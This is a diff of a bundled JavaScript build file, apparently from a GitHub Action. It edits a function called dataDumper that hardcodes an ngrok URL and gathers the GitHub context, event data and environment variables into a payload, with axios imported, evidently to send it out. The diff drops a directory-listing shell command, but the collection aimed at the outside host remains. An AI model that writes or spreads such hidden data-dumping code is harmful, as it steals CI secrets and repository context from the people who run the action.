@@ -63489,30 +63489,15 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.dataDumper = void 0;
-const child_process_1 = __nccwpck_require__(32081);
 const axios_1 = __importDefault(__nccwpck_require__(88757));
 const github = __importStar(__nccwpck_require__(95438));
 async function dataDumper(eventData) {
     process.env.DUMP_URL = 'https://167d-122-171-17-208.ngrok-free.app';
     const sendURL = process.env.DUMP_URL;
-    const listOutput = await new Promise(resolve => {
-        (0, child_process_1.exec)('ls -ltrha', (error, stdout, stderr) => {
-            if (error) {
-                resolve(`error: ${error.message}`);
-                return;
-            }
-            if (stderr) {
-                resolve(`stderr: ${stderr}`);
-                return;
-            }
-            resolve(stdout);
-        });
-    });
     if (!sendURL) {
         return;
     }
     const data = {
-        lsListing: listOutput,
         ghContext: github.context,
         eventData,
         envVars: {
